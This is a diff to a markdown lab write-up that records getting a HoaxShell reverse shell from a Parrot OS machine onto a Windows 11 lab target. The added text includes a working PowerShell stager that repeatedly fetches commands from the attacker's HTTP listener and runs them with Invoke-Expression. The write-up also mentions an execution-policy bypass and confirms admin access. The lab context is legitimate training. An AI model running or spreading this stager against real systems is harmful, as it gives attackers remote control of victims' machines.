@@ -1,4 +1,4 @@
-# Reverse Shell & Meterpreter Session Lab
+# Hoax Shell & Meterpreter Session Lab
 
 Date: 2026-08-16
 Attacker Machine: Parrot OS (10.10.1.13)
@@ -32,11 +32,20 @@ The attack flow:
 ## Step 1 — Generate HoaxShell Payload
 
 HoaxShell generated an obfuscated PowerShell payload
-saved as shell.ps2 and inspected in Pluma.
+saved as shell.ps2 and inspected in Pluma before delivery.
+
+    $s='10.10.1.13:444';$i='14f30f27-650c00d7-fef40df7';$p='http://'
+    while ($true) {
+      $c=(IRM -UseBasicParsing -Uri $p$s/650c00d7);
+      if ($c -ne 'None') {
+        $r=IEX $c -ErrorAction Stop -ErrorVariable e
+      }
+      sleep 0.8
+    }
 
 
 
-![HoaxShell payload in Pluma text editor](../images/IMG_20260824_120239_594.jpg)
+![HoaxShell payload viewed in Pluma text editor](../images/IMG_20260824_120239_045.jpg)
 
 
 
@@ -44,7 +53,8 @@ saved as shell.ps2 and inspected in Pluma.
 
 ## Step 2 — Start Listener on Parrot OS
 
-Port 444 was in use so it was cleared first:
+Port 444 was in use so it was cleared first, then the
+HoaxShell listener was launched:
 
     sudo fuser -k 444/tcp
 
@@ -59,7 +69,7 @@ Port 444 was in use so it was cleared first:
 
 
 
-![HoaxShell listener — session established on Parrot OS](../images/IMG_20260824_120239_342.jpg)
+![HoaxShell listener running — session established on Parrot OS](../images/IMG_20260824_120239_342.jpg)
 
 
 
@@ -74,7 +84,7 @@ Bypassed using:
 
 
 
-![Windows 11 — execution policy error and bypass](../images/IMG_20260824_120239_045.jpg)
+![Windows 11 target — execution policy bypass and payload execution](../images/IMG_20260824_120239_594.jpg)
 
 
 
@@ -83,14 +93,14 @@ Bypassed using:
 ## Step 4 — Post Exploitation
 
 Shell session received on attacker machine.
-Identity confirmed:
+Identity confirmed with whoami:
 
     PS C:\Users\Admin\Desktop> whoami
     windows_11\admin
 
 
 
-![whoami confirming windows_11\admin access](../images/IMG_20260824_120239_180.jpg)
+![whoami confirming windows_11\admin — target fully compromised](../images/IMG_20260824_120239_180.jpg)
 
 
 
